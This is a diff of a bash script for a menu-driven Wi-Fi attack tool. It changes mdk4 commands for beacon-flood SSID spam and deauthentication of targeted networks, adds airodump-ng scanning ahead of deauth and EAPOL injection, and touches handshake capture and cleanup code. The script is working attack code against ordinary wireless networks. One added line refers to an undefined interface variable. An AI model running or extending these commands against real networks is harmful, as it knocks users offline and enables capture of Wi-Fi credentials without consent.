@@ -65,23 +65,23 @@ read -p "Wordlist: " wordlist
 case $wordlist in
 1)
 	echo -e "Starting spamming ..."
-	watch -n 60 mdk4 $wlan0mon b -f ./ssidLists/ssid_common.txt -s 450 -w wta -m
+	watch -n 60 mdk4 $wlan0mon b -f ./ssidLists/ssid_common.txt -s 500
 	;;
 2)
 	echo -e "Starting spamming ..."
-	watch -n 60 mdk4 $wlan0mon b -f ./ssidLists/ssid_meme.txt -s 450 -w wta -m
+	watch -n 60 mdk4 $wlan0mon b -f ./ssidLists/ssid_meme.txt -s 500
 	;;
 3)
 	echo -e "Starting spamming ..."
-	watch -n 60 mdk4 $wlan0mon b -f ./ssidLists/ssid_rick.txt -s 450 -w wta -m
+	watch -n 60 mdk4 $wlan0mon b -f ./ssidLists/ssid_rick.txt -s 500
 	;;
 4)
 	echo -e "Starting spamming ..."
-	watch -n 60 mdk4 $wlan0mon b -f ./ssidLists/ssid_rick_pro.txt -s 450 -w wta  -m
+	watch -n 60 mdk4 $wlan0mon b -f ./ssidLists/ssid_rick_pro.txt -s 500
 	;;
 *)	
 	echo -e "Starting spamming ..."
-	watch -n 60 mdk4 $wlan0mon b -a 150 -s 450 -w wta -m
+	watch -n 60 mdk4 $wlan0mon b -a 150 -s 500
 	;;
 esac
 
@@ -89,6 +89,7 @@ esac
 
 DeauthAttack(){
 wlan0mon=$1
+airodump-ng $wlan0mon
 echo -e "
 ╔═════════════════════════════════╗
 ║     Select Deauth Magnitude     ║
@@ -133,7 +134,7 @@ case $magnitude in
 	2)
 		read -p "Enter SSID to Deauth: " TargetSsid
 		echo -e "Starting attack"
-		watch -n 60 mdk4 $wlan0mon d --essid $TargetSsid
+		watch -n 60 mdk4 $wlan0mon d -E $TargetSsid
 		;;	
 	3)
 		read -p "Enter Channel/s to Deauth (Format: ch,ch...): " channels
@@ -192,7 +193,7 @@ esac
 
 EapolInjection(){
 wlan0mon=$1
-
+airodump-ng $wlan1mon
 echo -e "
 ╔═════════════════════════════════╗
 ║     Select Injection Type       ║
@@ -251,9 +252,8 @@ GetHandshake() {
         fi
     done
 
-    wait 2>/dev/null
-    rm -f ./handshakes/*.csv ./handshakes/*.netxml
-
+    wait 2>/dev/null          
+    rm -f ./handshakes/*.csv ./handshakes/*.netxml  
     local FileName
     FileName=$(ls -t "$pcap_dir"/*.cap 2>/dev/null | head -n1)
 
@@ -388,11 +388,6 @@ while true; do
 		;;
 	c)
 		airmon-ng stop $wlan0mon > /dev/null
-		
-		systemctl start NetworkManager
-		systemctl status NetworkManager | grep "Active"
-		systemctl start wpa_supplicant
-		systemctl status wpa_supplicant | grep "Active"
 		;;
 
 	pp)
@@ -402,9 +397,6 @@ while true; do
 	ee|exit)
 		echo "Exiting ..."
 		airmon-ng stop $wlan0mon > /dev/null
-
-		systemctl start NetworkManager
-		systemctl start wpa_supplicant
 		break
 		;;
 	*)
